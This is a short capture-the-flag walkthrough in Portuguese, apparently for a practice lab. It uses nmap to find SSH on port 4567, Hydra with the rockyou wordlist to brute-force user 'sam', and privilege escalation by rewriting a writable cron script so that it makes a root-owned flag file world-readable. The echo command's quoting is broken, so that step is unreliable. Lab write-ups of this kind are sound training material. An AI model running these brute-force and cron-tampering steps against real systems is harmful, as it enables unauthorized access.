# _**Execução**_
Primeiro, buscamos em qual porta está localizado o SSH com o comando abaixo
> ```bash
> nmap -p 0-10000 -sV -A -T5 [ip_address]
> ```

porta 4567  
Vamos tentar um brute force com o Hydra no usuário sam  
> ```bash
> hydra -l sam -P /usr/share/wordlists/rockyou.txt ssh://[ip_address]:[port]
> ```

Senha: chocolate  
Realizamos login via SSH  
> ```bash
> ssh -p 4567 sam@[ip_address]
> ```

E logo na primeira tela, damos um ls para verificar quais arquivos estão neste diretório: flag1.txt  
Para a escalação de privilégios utilizando cron, vamos fazer o seguinte para encontrar o arquivo flag2.txt  
> ```bash
> find / -type f -name flag2.txt 2>/dev/null
> ```

Tentar ler o aqruivo com cat
```cat /home/ubuntu/flag2.txt```

Permissão negada  
```ls -l /home/ubuntu/flag2.txt```
```-r-------- 1 ubuntu ubuntu 38 Dec 19  2019 /home/ubuntu/flag2.txt```

Na pasta /home/scripts do usuário Sam, verificamos quais arquivos estão ali  
Um deles chama a atenção, clean_up.sh, do qual temos permissão de escrita  
Então, executamos o comando abaixo
> ```bash
> echo "bash -c "cat /home/ubuntu/flag2.txt" >> clean_up.sh
> ```

E em seguida, ```./clean_up.sh```
Sua execução tem permissão negada  
Navegamos para o diretório /home/ubuntu e dentro dele, alteramos o conteúdo de clean_up.sh com a seguinte linha  
```chmod 777 /home/ubuntu/flag2.txt```

E damos um ls -l
Vemos que temos permissão para ler o arquivo flag2.txt e obter o que queremos
